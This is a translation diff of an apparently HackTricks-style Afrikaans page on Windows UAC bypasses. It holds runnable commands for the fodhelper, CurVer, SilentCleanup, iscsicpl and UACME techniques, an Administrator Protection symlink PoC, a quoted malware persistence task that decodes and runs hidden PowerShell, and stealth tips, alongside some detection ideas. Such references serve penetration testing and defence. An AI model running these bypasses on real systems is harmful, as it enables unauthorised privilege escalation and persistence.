-- Verwag dat child-uitvoering in ’n **afsonderlike verhoogde proses** sal plaasvind; baie BOFs verhoog nie die huidige beacon in plek nie.
+- Verkies ’n **64-bit**-proses in die gebruiker se **interaktiewe sessie** (gewoonlik `explorer.exe` of ’n kindproses daarvan).
+- As ’n direkte shell misluk, probeer weer met ’n BOF-/UACME-implementering eerder as ’n naïewe `CreateProcess`-omslag.
+- Verwag dat die kindproses in ’n **afsonderlike verhoogde proses** uitgevoer word; baie BOFs verhoog nie die huidige beacon in-place nie.
 
 ### KRBUACBypass
 
-Dokumentasie en tool by [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
+Dokumentasie en hulpmiddel by [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
 
-### UAC-bypass exploits
+### UAC bypass exploits
 
-[**UACME**](https://github.com/hfiref0x/UACME) is ’n versameling UAC-bypass-tegnieke. Compileer dit met Visual Studio of MSBuild; die build skep verskeie executables (byvoorbeeld `Source\Akagi\output\x64\Debug\Akagi.exe`), dus kies die metode wat geskik is vir die teiken-build.<sup>[[3]](#references)</sup>\
-Wees versigtig: sommige bypasses begin sigbare programme of prompts wat die gebruiker kan waarsku.<sup>[[3]](#references)</sup>
+[**UACME**](https://github.com/hfiref0x/UACME) is ’n versameling UAC-bypass-tegnieke. Stel dit saam met Visual Studio of MSBuild; die build skep verskeie uitvoerbare lêers (byvoorbeeld `Source\Akagi\output\x64\Debug\Akagi.exe`), dus kies die metode wat geskik is vir die teiken-build.<sup>[[3]](#references)</sup>\
+Wees versigtig: sommige bypasses begin sigbare programme of aanporboodskappe wat die gebruiker kan waarsku.<sup>[[3]](#references)</sup>
 
-UACME het die **build-weergawe vanaf wanneer elke tegniek begin werk het**.<sup>[[3]](#references)</sup> Jy kan soek na ’n tegniek wat jou weergawes beïnvloed:
+UACME bevat die **build-weergawe vanaf wanneer elke tegniek begin werk het**.<sup>[[3]](#references)</sup> Jy kan soek na ’n tegniek wat jou weergawes raak:
+
 ```powershell
 PS C:\> [environment]::OSVersion.Version
 
@@ -189,42 +200,49 @@ Major  Minor  Build  Revision
 -----  -----  -----  --------
 10     0      14393  0
 ```
-Ook, deur [hierdie](https://en.wikipedia.org/wiki/Windows_10_version_history)-bladsy te gebruik, kry jy die Windows release `1607` uit die build-weergawes.
 
-’n Praktiese werksvloei is om eers die **host build** te **score**, en eers daarna die ooreenstemmende metode uit te voer:
+Ook, deur [hierdie](https://en.wikipedia.org/wiki/Windows_10_version_history)-bladsy te gebruik, kry jy die Windows-weergawe `1607` uit die bouweergawes.
+
+’n Praktiese werksvloei is om eers die gasheerbounommer te **bepaal**, en dan eers die ooreenstemmende metode uit te voer:
+
 ```cmd
 python main.py --scan uac
 Akagi64.exe 33 C:\Windows\System32\cmd.exe
 ```
-- `WinPwnage` vergelyk die plaaslike build vinnig met sy bekende UAC methods, wat nuttig is om dooie PoCs vinnig uit te skakel.<sup>[[4]](#references)</sup>
-- `UACME` bly die beste publieke katalogus om ’n bypass aan ’n presiese build te koppel. Version 3.7.1 het methods 83–85 bygevoeg, terwyl die voorafgaande release bestaande methods weer teen **Windows 11 25H2** getoets het; kontroleer die method table en release notes weer eerder as om aan te neem dat ’n ou PoC steeds onveranderd van toepassing is.<sup>[[3]](#references)[[9]](#references)</sup>
 
-### Always Notify-geskikte WNF/UIAccess-kettings (UACME 3.7.1)
+- `WinPwnage` vergelyk die plaaslike build vinnig met sy bekende UAC-metodes, wat nuttig is om dooie PoCs vinnig uit te sluit.<sup>[[4]](#references)</sup>
+- `UACME` bly die beste openbare katalogus om ’n bypass aan ’n presiese build te koppel. Weergawe 3.7.1 het metodes 83–85 bygevoeg, terwyl die vorige vrystelling bestaande metodes weer teen **Windows 11 25H2** getoets het; gaan die metodetabel en vrystellingsnotas weer na eerder as om aan te neem dat ’n ou PoC steeds onveranderd werk.<sup>[[3]](#references)[[9]](#references)</sup>
 
-`Always Notify` skakel nie elke UAC bypass uit nie. UACME 3.7.1 implementeer drie nuwe x64 methods wat gebruikerbeheerde environment-/protocol-state met verhoogde scheduled-task- of UIAccess-gedrag kombineer, en merk almal as `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>
+### WNF/UIAccess-kettings wat Always Notify ondersteun (UACME 3.7.1)
 
-- **83 — UnifiedConsent:** herlei `SystemRoot` sodat die WNF-getriggerde `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` verhoogde `taskhostw.exe` `unifiedconsent.dll` laat side-load. UACME volg dit vanaf Windows 10 build 19041.
-- **84 — TabTip:** gebruik dieselfde environment-variable primitive teen UIAccess `TabTip.exe`, wat, afhangend van die build, `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` of `rsaenh.dll` laai, en pivot dan vanaf die resulterende high-integrity UIAccess-context. UACME volg dit vanaf Windows 8.1 / Server 2016.
-- **85 — Narrator:** kaap die per-user `feedback-hub`-protocol, beheer Narrator met `Alt+CapsLock+F`, en launch dan ’n skryfbare kopie van `osk.exe` wat `OskSupport.dll` side-load. Dit vereis ’n interaktiewe desktop en word vanaf Windows 10 1809 / Server 2019 gevolg.
+`Always Notify` skakel nie elke UAC bypass uit nie. UACME 3.7.1 implementeer drie nuwe x64-metodes wat gebruikerbeheerbare omgewings-/protokoltoestand kombineer met verhoogde geskeduleerde-taak- of UIAccess-gedrag, en merk hulle al drie as `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>
 
-Nadat jy die payload units en Akagi gebou het soos deur UACME gedokumenteer, invoke die ooreenstemmende method number (die opsionele command gebruik by verstek `cmd.exe`):
+- **83 — UnifiedConsent:** herlei `SystemRoot` sodat die WNF-geaktiveerde `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` verhoogde `taskhostw.exe` laat sy-laai `unifiedconsent.dll`. UACME volg dit vanaf Windows 10 build 19041.
+- **84 — TabTip:** gebruik dieselfde omgewingsveranderlike-primitief teen UIAccess `TabTip.exe`, wat `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` of `rsaenh.dll` laai, afhangend van die build; beweeg dan van die gevolglike UIAccess-konteks met hoë integriteit af. UACME volg dit vanaf Windows 8.1 / Server 2016.
+- **85 — Narrator:** kaap die gebruiker-spesifieke `feedback-hub`-protokol, beheer Narrator met `Alt+CapsLock+F`, en begin dan ’n skryfbare kopie van `osk.exe` wat `OskSupport.dll` sy-laai. Dit vereis ’n interaktiewe lessenaar en word vanaf Windows 10 1809 / Server 2019 gevolg.
+
+Nadat jy die payload-eenhede en Akagi gebou het soos in UACME gedokumenteer, roep die ooreenstemmende metodenommer aan (die opsionele opdrag is by verstek `cmd.exe`):
+
 ```cmd
 Akagi64.exe 83 C:\Windows\System32\cmd.exe
 Akagi64.exe 84 C:\Windows\System32\cmd.exe
 Akagi64.exe 85 C:\Windows\System32\cmd.exe
 ```
-Methods 84 en 85 is afhanklik van UIAccess/desktop interaction, dus moenie verwag dat hulle onveranderd vanaf Session 0 of ’n nie-interaktiewe service shell sal werk nie. Al drie manipuleer environment/protocol state en stage DLLs; inspekteer die implementation en verwyder daardie artifacts nadat jy getoets het.<sup>[[3]](#references)[[9]](#references)</sup>
+
+Methods 84 en 85 is afhanklik van UIAccess/desktop-interaksie, moet dus nie verwag dat hulle onveranderd vanaf Session 0 of ’n nie-interaktiewe diensshell sal werk nie. Al drie manipuleer omgewings-/protokoltoestand en plaas DLL’s; ondersoek die implementering en verwyder daardie artefakte ná toetsing.<sup>[[3]](#references)[[9]](#references)</sup>
 
 ### UAC Bypass – fodhelper.exe (Registry hijack)
 
-Die trusted binary `fodhelper.exe` word op moderne Windows outomaties elevated. Wanneer dit geloods word, query dit die per-user registry path hieronder sonder om die `DelegateExecute`-verb te valideer. Deur ’n command daar te plant, kan ’n Medium Integrity process (user is in Administrators) ’n High Integrity process sonder ’n UAC prompt spawn.
+Die vertroude binary `fodhelper.exe` word outomaties verhoog op moderne Windows. Wanneer dit geloods word, raadpleeg dit die registerpad per gebruiker hieronder sonder om die `DelegateExecute`-werkwoord te valideer. Deur ’n opdrag daar te plaas, kan ’n Medium Integrity-proses (die gebruiker is in Administrators) ’n High Integrity-proses sonder ’n UAC-aanporboodskap laat begin.
 
-Registry path wat deur fodhelper gequery word:
+Registerpad wat deur fodhelper geraadpleeg word:
 ```text
 HKCU\Software\Classes\ms-settings\Shell\Open\command
 ```
+
 <details>
-<summary>PowerShell-stappe (stel jou payload in, en trigger dit dan)</summary>
+<summary>PowerShell-stappe (stel jou payload in, aktiveer dan)</summary>
+
 ```powershell
 # Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
 C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"
@@ -243,15 +261,21 @@ Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"
 # 4) (Recommended) Cleanup
 Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
 ```
+
 </details>
 Notas:
-- Werk wanneer die huidige gebruiker 'n lid van Administrators is en die UAC-vlak standaard/lenient is (nie Always Notify met ekstra beperkings nie).
-- Gebruik die `sysnative`-pad om 'n 64-bis PowerShell vanaf 'n 32-bis proses op 64-bis Windows te begin.
-- Payload kan enige opdrag wees (PowerShell, cmd of 'n EXE-pad). Vermy UI's wat versoeke vertoon vir stealth.
+- Werk wanneer die huidige gebruiker lid van Administrators is en die UAC-vlak verstek/lenient is (nie Always Notify met ekstra beperkings nie).
+- Gebruik die `sysnative`-pad om ’n 64-bit PowerShell vanaf ’n 32-bit-proses op 64-bit Windows te begin.
+- Payload kan enige opdrag wees (PowerShell, cmd of ’n EXE-pad). Vermy aanpor-UI’s vir stealth.
 
-#### CurVer/extension hijack-variant (slegs HKCU)
+#### `ComputerDefaults.exe`-trigger vir dieselfde `ms-settings`-handler
 
-Onlangse samples wat `fodhelper.exe` misbruik, vermy `DelegateExecute` en **redirect eerder die `ms-settings` ProgID** deur die per-user `CurVer`-waarde. Die auto-elevated binary resolve steeds die handler onder `HKCU`, dus is geen admin-token nodig om die keys te plant nie:<sup>[[5]](#references)</sup>
+`ComputerDefaults.exe` los dieselfde per-gebruiker-assosiasie `ms-settings\Shell\Open\command` op as `fodhelper.exe`.<sup>[[13]](#references)[[14]](#references)</sup> Nadat jy die verstekopdrag en leë `DelegateExecute`-waarde hierbo gestel het, gebruik `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` as ’n alternatiewe trigger; herhaal nie die registeropstelling nie.<sup>[[13]](#references)[[14]](#references)</sup> Die medium-integrity-administrateur- en UAC-beleidsvoorvereistes in die `fodhelper.exe`-notas hierbo geld steeds.<sup>[[2]](#references)[[3]](#references)</sup> UACME katalogiseer hierdie trigger vanaf Windows 10 RS4 (build 17134), dus bevestig dit op die teikenbuild.<sup>[[3]](#references)</sup>
+
+#### CurVer/uitbreidings-hijack-variant (slegs HKCU)
+
+Onlangse voorbeelde wat `fodhelper.exe` misbruik, vermy `DelegateExecute` en **herlei eerder die `ms-settings` ProgID** via die per-gebruiker-`CurVer`-waarde. Die outomaties verhoogde binary los steeds die handler onder `HKCU` op, dus is geen admin-token nodig om die sleutels te plant nie:<sup>[[5]](#references)</sup>
+
 ```powershell
 # Point ms-settings to a custom extension (.thm) and map that extension to our payload
 New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
@@ -260,103 +284,110 @@ Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Valu
 
 Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
 ```
-Sodra dit verhoog is, **skakel malware gewoonlik toekomstige prompts uit** deur `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` op `0` te stel, en voer dan verdere defense evasion uit (bv. `Add-MpPreference -ExclusionPath C:\ProgramData`) en skep persistence oor om as high integrity te loop. ’n Tipiese persistence-taak stoor ’n **XOR-encrypted PowerShell script** op skyf en dekodeer/voer dit elke uur in-memory uit:<sup>[[5]](#references)</sup>
+
+Sodra dit verhoogde regte verkry het, skakel malware gewoonlik toekomstige prompts af deur `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` op `0` te stel, voer dan verdere defense evasion uit (bv. `Add-MpPreference -ExclusionPath C:\ProgramData`) en herskep persistence om as high integrity te loop. ’n Tipiese persistence-taak stoor ’n XOR-encrypted PowerShell script op skyf en dekodeer/voer dit elke uur in-memory uit:<sup>[[5]](#references)</sup>
+
 ```powershell
 schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
 ```
-Hierdie variant ruim steeds die dropper op en laat slegs die staged payloads agter, wat maak dat detection afhanklik is van monitering van die **`CurVer`-hijack**, peutering aan `ConsentPromptBehaviorAdmin`, die skep van Defender exclusions, of scheduled tasks wat PowerShell in die geheue dekripteer.<sup>[[5]](#references)</sup>
 
-### UAC bypass via `SilentCleanup` task (`HKCU\Environment\windir`)
+Hierdie variant verwyder steeds die dropper en laat net die staged payloads agter, wat beteken dat opsporing afhanklik is van die monitering van die **`CurVer`-hijack**, peutering met `ConsentPromptBehaviorAdmin`, die skep van Defender-uitsluitings, of geskeduleerde take wat PowerShell in die geheue dekripteer.<sup>[[5]](#references)</sup>
 
-`SilentCleanup` launch `cleanmgr.exe` met die hoogste voorregte en brei `%windir%` uit die user environment. As jy `HKCU\Environment\windir` beheer, kan jy daardie uitbreiding na ’n arbitrêre command herlei en high integrity sonder ’n consent dialog verkry.<sup>[[8]](#references)</sup> Hierdie metode is steeds die moeite werd om op onlangse builds te toets, omdat UACME die technique aktief hou en onlangse issue tracking toon dat Windows 11 24H2 moontlik slegs klein quoting-aanpassings benodig.<sup>[[3]](#references)</sup>
+### UAC-omseiling via `SilentCleanup`-taak (`HKCU\Environment\windir`)
+
+`SilentCleanup` begin `cleanmgr.exe` met die hoogste voorregte en brei `%windir%` uit vanuit die gebruiker se omgewing. As jy beheer het oor `HKCU\Environment\windir`, kan jy daardie uitbreiding na ’n arbitrêre opdrag herlei en hoë integriteit verkry sonder ’n toestemmingsdialoog.<sup>[[8]](#references)</sup> Hierdie metode is steeds die moeite werd om op onlangse builds te toets, omdat UACME die tegniek aktief hou en onlangse kwessie-opsporing aandui dat Windows 11 24H2 dalk net klein aanpassings aan aanhalingstekens vereis.<sup>[[3]](#references)</sup>
+
 ```cmd
 reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
 schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
 reg delete "HKCU\Environment" /v windir /f
 ```
-As die taak die pad op daardie build aanhaal, probeer weer met die payload wat met ’n aanhalingsteken eindig (byvoorbeeld `cmd.exe"`). Maak altyd `HKCU\Environment\windir` skoon nadat jy getoets het.
 
-#### Meer UAC bypass
+As die taak die pad op daardie build aanhaal, probeer weer met ’n payload wat met ’n aanhalingsteken eindig (byvoorbeeld `cmd.exe"`). Maak altyd `HKCU\Environment\windir` skoon ná toetsing.
 
-Baie klassieke UAC bypasses wat UI-flows, COM-objects of desktop interaction misbruik, vereis ’n **full interactive session** met die slagoffer; ’n algemene `nc.exe`-shell of ’n service wat in **Session 0** loop, is dikwels nie genoeg nie.
+#### Meer UAC-bypasses
 
-Jy kan dit dikwels oplos deur ’n **meterpreter**-session te gebruik. Migrate na ’n **process** waarvan die **Session**-waarde gelyk is aan **1**:
+Baie klassieke UAC-bypasses wat UI-vloeie, COM-objekte of interaksie met die werkskerm misbruik, vereis ’n **volledige interaktiewe sessie** met die slagoffer; ’n gewone `nc.exe`-shell of ’n diens wat in **Session 0** loop, is dikwels nie genoeg nie.
 
-![Point ms-settings to a custom extension (.thm) and map that extension to our payload - More UAC bypass: You can get using a meterpreter session. Migrate to a process that has the Session...](<../../images/image (863).png>)
+Jy kan dit dikwels oplos met ’n **meterpreter**-sessie. Migreer na ’n **proses** waarvan die **Session**-waarde gelyk is aan **1**:
+
+![Wys ms-settings na ’n pasgemaakte uitbreiding (.thm) en koppel daardie uitbreiding aan ons payload - Meer UAC-bypass: Jy kan dit met ’n meterpreter-sessie doen. Migreer na ’n proses waarvan die Session...](<../../images/image (863).png>)
 
 (_explorer.exe_ behoort te werk)
 
-### UAC Bypass met GUI
+### UAC-bypass met GUI
 
-As jy toegang tot ’n **GUI** het, kan jy eenvoudig die UAC-prompt aanvaar wanneer dit verskyn; jy het nie werklik ’n tegniese bypass nodig nie. Daarom is die verkryging van ’n GUI-session dikwels genoeg om die praktiese wrywing wat deur UAC veroorsaak word, te omseil.
+As jy toegang tot ’n **GUI het, kan jy die UAC-prompt eenvoudig aanvaar** wanneer dit verskyn; jy het nie werklik ’n tegniese bypass nodig nie. Daarom is ’n GUI-sessie dikwels genoeg om die praktiese hindernis wat UAC byvoeg, te omseil.
 
-Verder, as jy ’n GUI-session kry wat iemand gebruik het (moontlik via RDP), sal **sommige tools as administrator loop**, vanwaar jy byvoorbeeld ’n **cmd** direk **as admin kan run** sonder om weer deur UAC gevra te word, soos [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Dit kan ’n bietjie meer **stealthy** wees.
+Verder, as jy ’n GUI-sessie kry wat iemand gebruik het (moontlik via RDP), sal daar **sommige nutsgoed wees wat as administrator loop**. Van daar af kan jy byvoorbeeld ’n **cmd** direk **as admin** uitvoer sonder dat UAC jou weer vra, soos met [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Dit kan ’n bietjie meer **stealthy** wees.
 
-### Geraasvolle brute-force UAC bypass
+### Geraasvolle brute-force UAC-bypass
 
-As geraas aanvaarbaar is, kan ’n tool soos [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) herhaaldelik elevation versoek totdat die gebruiker dit aanvaar.
+As geraas aanvaarbaar is, kan ’n nutsding soos [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) herhaaldelik vir verhoogde regte vra totdat die gebruiker dit aanvaar.
 
-### Jou eie bypass - Basiese UAC bypass-metodologie
+### Jou eie bypass - Basiese UAC-bypass-metodologie
 
-As jy na **UACME** kyk, sal jy opmerk dat **baie UAC bypasses DLL hijacking misbruik** (dikwels deur ’n elevated binary ’n attacker-controlled DLL vanaf ’n writable path te laat load). [Read this to learn how to find a DLL hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).
+As jy na **UACME** kyk, sal jy sien dat **baie UAC-bypasses DLL hijacking misbruik** (dikwels deur ’n verhoogde binary ’n aanvaller-beheerde DLL vanaf ’n skryfbare pad te laat laai). [Lees dit om te leer hoe om ’n DLL hijacking-kwesbaarheid te vind](../windows-local-privilege-escalation/dll-hijacking/index.html).
 
-1. Vind ’n binary wat sal **autoelevate** (kontroleer dat dit, wanneer dit uitgevoer word, op ’n high integrity level loop).
-2. Gebruik procmon om "**NAME NOT FOUND**"-events te vind wat kwesbaar vir **DLL Hijacking** kan wees.
-3. Jy sal waarskynlik die DLL binne sekere **protected paths** (soos C:\Windows\System32) moet **write**, waar jy nie skryftoestemmings het nie. Jy kan dit omseil deur:
-1. **wusa.exe**: Windows 7,8 en 8.1. Dit laat jou toe om die inhoud van ’n CAB-file binne protected paths te extract (omdat hierdie tool vanaf ’n high integrity level uitgevoer word).
-2. **IFileOperation**: Windows 10.
-4. Berei ’n **script** voor om jou DLL binne die protected path te copy en die kwesbare, autoelevated binary uit te voer.
+1. Vind ’n binary wat **outomaties verhoogde regte kry** (kyk of dit op ’n hoë integrity-vlak loop wanneer dit uitgevoer word).
+2. Gebruik procmon om "**NAME NOT FOUND**"-gebeurtenisse te vind wat kwesbaar vir **DLL Hijacking** kan wees.
+3. Jy sal waarskynlik die DLL binne ’n **beskermde pad** (soos C:\Windows\System32) moet **skryf**, waar jy nie skryftoestemmings het nie. Jy kan dit omseil deur:
+   1. **wusa.exe**: Windows 7, 8 en 8.1. Dit laat jou toe om die inhoud van ’n CAB-lêer binne beskermde paaie uit te pak (omdat hierdie nutsding vanaf ’n hoë integrity-vlak uitgevoer word).
+   2. **IFileOperation**: Windows 10.
+4. Berei ’n **script** voor om jou DLL na die beskermde pad te kopieer en die kwesbare, outomaties verhoogde binary uit te voer.
 
-### Nog ’n UAC bypass-tegniek
+### Nog ’n UAC-bypass-tegniek
 
-Dit behels dat jy kyk of ’n **autoElevated binary** probeer om die **naam/pad** van ’n **binary** of **command** wat uitgevoer moet word, vanaf die **registry** te **read** (dit is interessanter as die binary hierdie inligting binne die **HKCU** soek).
+Dit behels dat jy kyk of ’n **autoElevated binary** probeer om die **naam/pad** van ’n **binary** of **command** wat uitgevoer moet word, uit die **registry** te **lees** (dit is interessanter as die binary hierdie inligting in **HKCU** soek).
 
-### UAC bypass via `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack
+### UAC-bypass via `SysWOW64\iscsicpl.exe` + DLL hijack met die gebruiker se `PATH`
 
-Die 32-bit `C:\Windows\SysWOW64\iscsicpl.exe` is ’n **auto-elevated** binary wat misbruik kan word om `iscsiexe.dll` volgens die search order te load. As jy ’n malicious `iscsiexe.dll` binne ’n **user-writable** folder kan plaas en dan die huidige user se `PATH` wysig (byvoorbeeld via `HKCU\Environment\Path`) sodat daardie folder gesoek word, kan Windows die attacker DLL binne die elevated `iscsicpl.exe`-process load **sonder om ’n UAC-prompt te wys**.<sup>[[1]](#references)[[6]](#references)</sup>
+Die 32-bis `C:\Windows\SysWOW64\iscsicpl.exe` is ’n **auto-elevated** binary wat misbruik kan word om `iscsiexe.dll` volgens die soekvolgorde te laai. As jy ’n kwaadwillige `iscsiexe.dll` in ’n **skryfbare gebruikerslêergids** kan plaas en dan die huidige gebruiker se `PATH` verander (byvoorbeeld via `HKCU\Environment\Path`) sodat daardie lêergids deursoek word, kan Windows die aanvaller se DLL binne die verhoogde `iscsicpl.exe`-proses laai **sonder om ’n UAC-prompt te wys**.<sup>[[1]](#references)[[6]](#references)</sup>
 
 Praktiese notas:
-- Dit is nuttig wanneer die huidige user in **Administrators** is, maar op **Medium Integrity** loop weens UAC.
-- Die **SysWOW64**-kopie is die relevante een vir hierdie bypass. Behandel die **System32**-kopie as ’n afsonderlike binary en valideer gedrag onafhanklik.
-- Die primitive is ’n kombinasie van **auto-elevation** en **DLL search-order hijacking**, dus is dieselfde ProcMon-workflow wat vir ander UAC bypasses gebruik word, nuttig om die ontbrekende DLL-load te valideer.
+- Dit is nuttig wanneer die huidige gebruiker in **Administrators** is, maar weens UAC op **Medium Integrity** loop.
+- Die **SysWOW64**-kopie is die relevante een vir hierdie bypass. Behandel die **System32**-kopie as ’n aparte binary en bevestig die gedrag daarvan onafhanklik.
+- Die primitive is ’n kombinasie van **auto-elevation** en **DLL search-order hijacking**, dus is dieselfde ProcMon-werkvloei wat vir ander UAC-bypasses gebruik word nuttig om te bevestig dat die DLL-laai ontbreek.
 
-Minimale flow:
+Minimale vloei:
+
 ```cmd
 copy iscsiexe.dll %TEMP%\iscsiexe.dll
 reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
 C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
 ```
+
 Opsporingsidees:
-- Stel 'n waarskuwing op vir `reg add` / registerskrywings na `HKCU\Environment\Path` wat onmiddellik gevolg word deur die uitvoering van `C:\Windows\SysWOW64\iscsicpl.exe`.
+- Stel 'n waarskuwing op vir `reg add` / registerskrywes na `HKCU\Environment\Path` wat onmiddellik gevolg word deur die uitvoering van `C:\Windows\SysWOW64\iscsicpl.exe`.
 - Soek na `iscsiexe.dll` in **gebruiker-beheerde** liggings soos `%TEMP%` of `%LOCALAPPDATA%\Microsoft\WindowsApps`.
-- Korrelleer die bekendstelling van `iscsicpl.exe` met onverwagte kinderprosesse of DLL-ladings vanuit buite die normale Windows-gidse.
+- Korrelleer die bekendstelling van `iscsicpl.exe` met onverwagte kinderprosesse of DLL-laaie van buite die normale Windows-gidse.
 
-### Nuwer navorsing wat afsonderlik nagegaan behoort te word
+### Nuwer navorsing wat afsonderlik nagegaan moet word
 
-Sommige kettings ná 2024 lyk nie meer soos die klassieke `HKCU\Software\Classes`-registerkapings nie. Activation-context cache poisoning kan byvoorbeeld 'n **drive remap** en **DLL redirection** kombineer om van medium na hoë integriteit te beweeg deur vertroude UI- / auto-elevated binaries soos `ctfmon.exe` en latere teikens soos `fodhelper.exe`. In plaas daarvan om die groot PoC hier te dupliseer, kyk na die kompakte payload-voorbeelde in:
+Sommige kettings wat ná 2024 ontdek is, lyk nie meer soos die klassieke `HKCU\Software\Classes`-registerkaping nie. Activation-context cache poisoning kan byvoorbeeld drive remap en DLL redirection kombineer om van medium- na hoë integriteit oor te skakel deur vertroude UI- / auto-elevated-binaries soos `ctfmon.exe` en latere teikens soos `fodhelper.exe`. In plaas daarvan om die groot PoC hier te dupliseer, raadpleeg die bondige payload-voorbeelde in:
 
 {{#ref}}
 ../windows-local-privilege-escalation/windows-c-payloads.md
 {{#endref}}
 
-### Administrator Protection (voorskou) drive-letter hijack via per-logon-session DOS device map
+### Administrator Protection (voorskou): drive-letter-kaping via per-aanmeldingsessien DOS-toestelkaart
 
 > [!NOTE]
-> Vanaf Augustus 2026 dokumenteer Microsoft Administrator Protection steeds as 'n **Insider-voorskou**: die bekendstelling in Oktober 2025 is teruggerol en word vir 'n latere datum beplan. Bevestig dat **Admin Approval Mode with Administrator protection** werklik geaktiveer is en dat die toestel herlaai is voordat hierdie kettings getoets word; 'n standaard 25H2-weergawe-string alleen bewys nie dat die funksie aktief is nie.<sup>[[10]](#references)</sup>
+> Vanaf Augustus 2026 dokumenteer Microsoft Administrator Protection steeds as 'n **Insider-voorskou**: die ontplooiing in Oktober 2025 is teruggerol en word vir 'n latere datum beplan. Bevestig dat **Admin Approval Mode with Administrator protection** werklik geaktiveer is en dat die toestel herlaai is voordat jy hierdie kettings toets; 'n gewone 25H2-weergawestring alleen bewys nie dat die funksie aktief is nie.<sup>[[10]](#references)</sup>
 
-Vir die volledige `RAiLaunchAdminProcess` / UIAccess-aanvalsoppervlak op Windows 11 25H2-voorskoubouversies, kyk na die toegewyde bladsy:
+Vir die volledige `RAiLaunchAdminProcess` / UIAccess-aanvalsoppervlak op Windows 11 25H2-voorskoubouwe, raadpleeg die toegewyde bladsy:
 
 {{#ref}}
 ../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
 {{#endref}}
 
-Windows 11 25H2 “Administrator Protection” gebruik shadow-admin tokens met per-sessie `\Sessions\0\DosDevices/<LUID>`-maps. Die gids word lui deur `SeGetTokenDeviceMap` geskep met die eerste `\??`-resolusie. As die aanvaller die shadow-admin-token slegs op **SecurityIdentification** naboots, word die gids geskep met die aanvaller as **eienaar** (erf `CREATOR OWNER`), wat drive-letter-skakels moontlik maak wat voorkeur bo `\GLOBAL??` geniet.<sup>[[7]](#references)</sup>
+Windows 11 25H2 se “Administrator Protection” gebruik shadow-admin-tokens met per-sessie `\Sessions\0\DosDevices/<LUID>`-kaarte. Die gids word lui geskep deur `SeGetTokenDeviceMap` wanneer `\??` die eerste keer opgelos word. As die aanvaller die shadow-admin-token slegs op **SecurityIdentification**-vlak naboots, word die gids geskep met die aanvaller as **eienaar** (erf `CREATOR OWNER`), wat drive-letter-skakels toelaat wat voorrang geniet bo `\GLOBAL??`.<sup>[[7]](#references)</sup>
 
 **Stappe:**
 
-1. Roep vanuit 'n sessie met lae privilegies `RAiProcessRunOnce` aan om 'n promptless shadow-admin `runonce.exe` te skep.
-2. Dupliceer sy primêre token na 'n **identification**-token en boots dit na terwyl `\??` oopgemaak word om die skepping van `\Sessions\0\DosDevices/<LUID>` onder aanvaller-eienaarskap af te dwing.
-3. Skep daar 'n `C:`-simboliese skakel wat na aanvaller-beheerde berging wys; daaropvolgende lêerstelseltoegange in daardie sessie los `C:` na die aanvallerpad op, wat DLL-/lêerkaping sonder 'n prompt moontlik maak.
+1. Roep vanuit 'n sessie met lae voorregte `RAiProcessRunOnce` aan om 'n shadow-admin `runonce.exe` sonder 'n prompt te begin.
+2. Dupliseer sy primêre token as 'n **identification**-token en boots dit na terwyl `\??` oopgemaak word, om die skepping van `\Sessions\0\DosDevices/<LUID>` onder die aanvaller se eienaarskap af te dwing.
+3. Skep daar 'n `C:`-simboliese skakel wat na berging onder die aanvaller se beheer wys; daaropvolgende lêerstelseltoegange in daardie sessie laat `C:` na die aanvaller se pad wys, wat DLL-/lêerkaping sonder 'n prompt moontlik maak.
 
 **PowerShell PoC (NtObjectManager):**
 ```powershell
@@ -368,24 +399,31 @@ Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | 
 $auth = Get-NtTokenId -Authentication -Token $id
 New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
 ```
-Op preview hosts teken Administrator Protection goedkeurings en mislukkings aan as ETW-gebeurtenisse **15031** en **15032** onder die `Microsoft-Windows-LUA`-provider. Die gebeurtenisse bevat die aanvraer se SID, toepassingspad, uitkoms, bestuurde administrateurrekening en authentication method, dus is herhaalde exploit-pogings of mislukte UI-driving nie sonder telemetry nie.<sup>[[10]](#references)</sup>
+
